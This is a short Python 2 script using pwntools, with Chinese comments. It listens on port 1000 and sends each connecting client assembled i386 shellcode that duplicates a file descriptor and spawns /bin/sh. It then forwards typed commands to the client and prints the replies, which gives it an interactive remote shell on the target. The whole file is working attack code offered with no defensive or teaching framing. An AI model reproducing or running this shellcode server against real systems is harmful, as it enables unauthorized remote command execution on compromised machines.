#!/usr/bin/python
# -*- coding: UTF-8 -*-

import socket               # 导入 socket 模块
import thread
from pwn import *
context.arch="i386"
def print_recv(s):
    while(s):
        result = s.recv(1024)
        if(result):
            print(result)
        else:
            return

s = socket.socket()         # 创建 socket 对象
host = '0.0.0.0'  # 获取本地主机名
port = 1000                # 设置端口
s.bind((host, port))        # 绑定端口
shellcode='''
mov ebx, 3
mov ecx, 1
mov eax, 63 ;// SYS_dup2
int 0x80

;// execve("/bin/sh", NULL, NULL)
push 0x0068732f
push 0x6e69622f
mov ebx,esp
mov eax,0x0b
mov ecx,0
mov edx,0
int 0x80

;// exit(0)
mov ebx, 0
mov eax, 1
int 0x80
'''
s.listen(1)                 # 等待客户端连接
while True:
    c, addr = s.accept()     # 建立客户端连接
    print ('连接地址：' + str(addr))
    c.send(asm(shellcode))
    try:
        thread.start_new_thread(print_recv, (c, ))
        while(True):
            c.send(raw_input() + '\n')
    except Exception as e:
        print(e)
        print("Disconnect")
        c.close()